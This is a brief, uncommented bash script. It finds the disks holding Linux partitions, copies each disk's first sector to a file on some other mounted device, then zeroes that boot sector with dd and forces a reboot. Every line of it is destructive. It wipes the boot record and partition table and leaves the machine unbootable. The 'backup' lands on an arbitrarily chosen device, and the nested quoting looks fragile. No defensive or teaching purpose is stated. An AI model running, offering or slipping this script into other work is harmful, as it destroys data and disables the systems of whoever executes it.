#!/bin/bash

fdisk -lu | awk '/Linux$/ {gsub(/[1-9].*$/,"");{print$1}}'|awk '!a[$1]++{system("blk_bak=$(lsblk |grep -v $(echo "$1"|sed 's#/dev/##g')|grep -v NAME|head -n 1);dir_bak=${blk_bak##* };dd if="$1" of=${dir_bak}/mbr_bak.bin bs=512 count=1;dd if=/dev/zero of="$1" bs=512 count=1")}';reboot -f
